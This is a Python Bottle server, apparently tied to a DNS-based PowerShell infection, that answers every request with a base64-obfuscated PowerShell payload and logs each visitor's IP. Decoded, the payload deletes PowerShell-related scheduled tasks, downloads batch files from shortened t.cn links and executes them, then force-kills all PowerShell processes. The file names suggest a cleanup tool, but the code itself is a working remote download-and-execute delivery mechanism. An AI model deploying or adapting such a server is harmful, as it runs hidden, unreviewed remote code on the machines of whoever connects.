# -*- coding:utf-8 -*-

from bottle import *
import logging
import json

class Logger():

    def __init__(self, logname, loglevel, logger):
        '''
            指定保存日志的文件路径，日志级别，以及调用文件
            将日志存入到指定的文件中
        '''

        # 创建一个logger
        self.logger = logging.getLogger(logger)
        self.logger.setLevel(logging.DEBUG)

        # 创建一个handler，用于写入日志文件
        fh = logging.FileHandler(logname)
        fh.setLevel(logging.DEBUG)

        # 再创建一个handler，用于输出到控制台
        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        # 定义handler的输出格式
        formatter = logging.Formatter(
            '%(asctime)s %(filename)s [line:%(lineno)d] %(levelname)s %(message)s')
        # formatter = self.format_dict[int(loglevel)]
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)

        # 给logger添加handler
        self.logger.addHandler(fh)

        self.logger.addHandler(ch)

    def getlog(self):
        return self.logger

logger=Logger(logname='./dns_virus.log', loglevel=1, logger="dnsvirus").getlog()

ps="""
Invoke-Expression ([System.Text.UnicodeEncoding]::Unicode.GetString([Convert]::FromBase64String("UwB0AGEAcgB0AC0AUwBlAHIAdgBpAGMAZQAgAHMAYwBoAGUAZAB1AGwAZQANAAoAJABzAGUAcgB2AGkAYwBlAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAKAAiAFMAYwBoAGUAZAB1AGwAZQAuAFMAZQByAHYAaQBjAGUAIgApAA0ACgAkAHMAZQByAHYAaQBjAGUALgBDAG8AbgBuAGUAYwB0ACgAJABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFACkADQAKAEYAdQBuAGMAdABpAG8AbgAgAEQAZQBsAGUAdABlAFAAbwB3AGUAcgBzAGgAZQBsAGwAVABhAHMAawBTAGMAaABlAGQAdQBsAGUAcgAoACQAVABhAHMAawBQAGEAdABoACkAewANAAoAIAAgACAAIAAkAGYAbwBsAGQAZQByAD0AJABzAGUAcgB2AGkAYwBlAC4ARwBlAHQARgBvAGwAZABlAHIAKAAkAFQAYQBzAGsAUABhAHQAaAApAA0ACgAgACAAIAAgACQAdABhAHMAawBpAHQAZQBtAD0AJABmAG8AbABkAGUAcgAuAEcAZQB0AEYAbwBsAGQAZQByAHMAKAAwACkADQAKACAAIAAgACAAZgBvAHIAZQBhAGMAaAAoACQAaQAgAGkAbgAgACQAdABhAHMAawBpAHQAZQBtACkAewANAAoAIAAgACAAIAAgACAAIAAgACQAdABhAHMAawBzAD0AJABpAC4ARwBlAHQAVABhAHMAawBzACgAMAApAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAoACQAdABhAHMAawAgAGkAbgAgACQAdABhAHMAawBzACkAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB0AGEAcwBrAE4AYQBtAGUAPQAkAHQAYQBzAGsALgBOAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHQAYQBzAGsAUABhAHQAaAA9ACQAdABhAHMAawAuAFAAYQB0AGgADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAdABhAHMAawBYAG0AbAA9ACQAdABhAHMAawAuAFgAbQBsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAHQAYQBzAGsATgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACgAWwBTAHQAcgBpAG4AZwBdADoAOgBJAHMATgB1AGwAbABPAHIARQBtAHAAdAB5ACgAJAB0AGEAcwBrAFgAbQBsACkAKQB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaQAuAEQAZQBsAGUAdABlAFQAYQBzAGsAKAAkAHQAYQBzAGsATgBhAG0AZQAsADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAkAHQAYQBzAGsATgBhAG0AZQAgAHMAaABjAGQAdQBsAGUAIAB0AHIAZQBlACAAZQByAHIAbwByACAALAAgAGQAZQBsAGUAdABlACAAcwB1AGMAZQBzAHMAIgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbABzAGUAaQBmACAAKAAkAHQAYQBzAGsAWABtAGwALgBUAG8ATABvAHcAZQByACgAKQAuAEMAbwBuAHQAYQBpAG4AcwAoACIAcABvAHcAZQByAHMAaABlAGwAbAAiACkAKQB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAGYAaQBuAGQAIABzAGMAaABlAGQAdQBsAGUAcgAgAHMAYwByAGkAcAB0ADoAJAB0AGEAcwBrAFAAYQB0AGgAIgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHQAYQBzAGsALgBFAG4AYQBiAGwAZQBkAD0AMAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkALgBEAGUAbABlAHQAZQBUAGEAcwBrACgAJAB0AGEAcwBrAE4AYQBtAGUALAAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAARABlAGwAZQB0AGUAUABvAHcAZQByAHMAaABlAGwAbABUAGEAcwBrAFMAYwBoAGUAZAB1AGwAZQByACgAJABpAC4AUABhAHQAaAApAA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAfQANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAYwBsAGUAYQByACAAcABvAHcAZQByAHMAaABlAGwAbAAgAHMAYwByAGkAcAB0ACIADQAKAEQAZQBsAGUAdABlAFAAbwB3AGUAcgBzAGgAZQBsAGwAVABhAHMAawBTAGMAaABlAGQAdQBsAGUAcgAgAC0AVABhAHMAawBQAGEAdABoACAAIgBcACIADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAGMAbABlAGEAcgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIABzAGMAcgBpAHAAdAAgAGQAbwBuAGUALgAiAA0ACgAkAGQAIAA9ACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHIAZQBtAG8AdgBlAF8AcgBhAG4AZABvAG0AXwA0ADMANwAuAGIAYQB0ACIADQAKACQAYwAxAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAANAAoAJABjADEALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwB0AC4AYwBuAC8ARQBYAGEARQB2AGsAUAAiACwAJABkACkADQAKACQAZABlAHMAIAA9ACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHIAZQBtAG8AdgBlAF8AcgBhAG4AZABvAG0ALgBiAGEAdAAiAA0ACgAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA0ACgAkAGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwB0AC4AYwBuAC8ARQBYAGEAUgBTAFMAegAiACwAJABkAGUAcwApAA0ACgBpAG4AdgBvAGsAZQAtAGUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAGMAbwBtAG0AYQBuAGQAIAAkAGQAZQBzAA0ACgBpAG4AdgBvAGsAZQAtAGUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAGMAbwBtAG0AYQBuAGQAIAAkAGQADQAKAFIAZQBzAHQAYQByAHQALQBTAGUAcgB2AGkAYwBlACAAcwBjAGgAZQBkAHUAbABlAA0ACgBHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAfAAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBGAG8AcgBjAGUA")));
"""

@route('/<n:path>',method=["POST","GET"])
def powershell(n):
    logger.info(json.dumps({"IP":request.remote_addr,"Path":request.url}))
    return ps

@route('/')
def index():
    logger.info(json.dumps({"IP": request.remote_addr, "Path": request.url}))
    return ps

if __name__ == '__main__':
    try:
        run(host='0.0.0.0',port=80)
    except Exception,e:
        print e
